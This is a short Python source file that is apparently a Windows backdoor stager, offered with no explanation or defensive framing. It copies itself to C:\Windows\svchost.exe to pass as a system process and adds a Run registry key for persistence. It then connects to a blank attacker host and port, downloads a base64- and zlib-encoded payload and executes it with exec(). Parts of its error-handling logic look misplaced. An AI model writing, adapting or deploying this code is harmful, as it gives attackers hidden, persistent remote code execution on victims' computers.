import socket,subprocess,struct,os,sys,time,zlib,base64

HOST = '' #lhost
PORT =     #lport 

def main():
    from shutil import copyfile
    checkfile = os.path.isfile("C:\\Windows\svchost.exe")
    if checkfile == True:
        exist()
    else:
    # Copy file to C:
        copyfile(os.path.basename(sys.argv[0]), "C:\\Windows\svchost.exe")
        subprocess.call("reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v svchost /t REG_SZ /d C:\\Windows\svchost.exe /f", shell=True)
    
        connect()


def connect():
    try:
        try:
            for x in range(10):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                break
        except:
            time.sleep(5)
            l = struct.unpack('>I', s.recv(4))[0]
            d = s.recv(l)
            while len(d) < l:
                d += s.recv(l - len(d))
            exec(zlib.decompress(base64.b64decode(d)), {'s': s})





    except socket.error as e:
        time.sleep(10)
        connect()


def exist():
    connect()
    pass

if __name__ == '__main__':
    while True:
      main()
